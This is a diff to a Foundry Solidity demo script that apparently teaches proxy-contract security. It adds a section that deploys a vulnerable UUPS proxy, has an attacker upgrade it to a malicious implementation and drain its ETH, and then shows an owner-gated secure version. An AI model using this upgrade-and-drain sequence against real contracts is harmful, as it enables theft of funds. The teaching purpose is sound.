@@ -2,9 +2,13 @@
 pragma solidity ^0.8.24;
 
 import "forge-std/Script.sol";
+import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import "../src/vulnerable/BadProxy.sol";
 import "../src/vulnerable/VulnerableLogicV1.sol";
 import "../src/vulnerable/VulnerableLogicV2.sol";
+import "../src/vulnerable/VulnerableUUPS.sol";
+import "../src/vulnerable/MaliciousImpl.sol";
+import "../src/vulnerable/SecureUUPS.sol";
 import "../src/secure/SecureLogicV1.sol";
 import "../src/secure/SecureLogicV2.sol";
 import "../src/secure/SecureProxy.sol";
@@ -38,6 +42,9 @@ contract AllDemo is Script {
 
         // PART 3: UNINITIALIZED IMPLEMENTATION ATTACK
         _demoUninitializedAttack(deployerKey, attackerKey, attacker);
+
+        // PART 4: UNAUTHORIZED UUPS UPGRADE ATTACK
+        _demoUnauthorizedUpgrade(deployerKey, attackerKey, attacker);
     }
 
     function _demoSecureFlow(uint256 deployerKey, address deployer) internal {
@@ -127,6 +134,50 @@ contract AllDemo is Script {
         SecureLogicV1 secureImpl = new SecureLogicV1();
         console.log("[SECURE] SecureLogicV1 deployed");
         console.log("  _disableInitializers() blocks attack");
+        vm.stopBroadcast();
+    }
+
+    function _demoUnauthorizedUpgrade(uint256 deployerKey, uint256 attackerKey, address attacker) internal {
+        console.log("");
+        console.log("================================================================");
+        console.log("  PART 4: UNAUTHORIZED UUPS UPGRADE ATTACK");
+        console.log("================================================================");
+
+        // Setup: deployer deploys VulnerableUUPS behind an ERC1967Proxy and funds it
+        vm.startBroadcast(deployerKey);
+        VulnerableUUPS logic = new VulnerableUUPS();
+        ERC1967Proxy proxy = new ERC1967Proxy(
+            address(logic),
+            abi.encodeWithSelector(VulnerableUUPS.initialize.selector)
+        );
+        console.log("[SETUP] VulnerableUUPS proxy deployed");
+        console.log("  Proxy:", address(proxy));
+        payable(address(proxy)).transfer(1 ether);
+        console.log("  Proxy balance before:", address(proxy).balance);
+        vm.stopBroadcast();
+
+        // Attack: any caller can call upgradeToAndCall and then drain ETH
+        vm.startBroadcast(attackerKey);
+        MaliciousImpl mal = new MaliciousImpl();
+        VulnerableUUPS(payable(address(proxy))).upgradeToAndCall(address(mal), "");
+        console.log("[ATTACK] Upgraded to malicious impl:", address(mal));
+        MaliciousImpl(payable(address(proxy))).drainFunds(payable(attacker));
+        console.log("[ATTACK] Funds drained to attacker");
+        console.log("  Proxy balance after:", address(proxy).balance);
+        console.log("  *** PROXY DRAINED! ***");
+        vm.stopBroadcast();
+
+        // Secure: _authorizeUpgrade gated by onlyOwner
+        vm.startBroadcast(deployerKey);
+        address deployer = vm.addr(deployerKey);
+        SecureUUPS secureLogic = new SecureUUPS();
+        ERC1967Proxy secureProxy = new ERC1967Proxy(
+            address(secureLogic),
+            abi.encodeWithSelector(SecureUUPS.initialize.selector, deployer)
+        );
+        console.log("[SECURE] SecureUUPS proxy deployed");
+        console.log("  onlyOwner in _authorizeUpgrade blocks unauthorized upgrades");
+        console.log("  SecureProxy:", address(secureProxy));
         vm.stopBroadcast();
 
         console.log("");
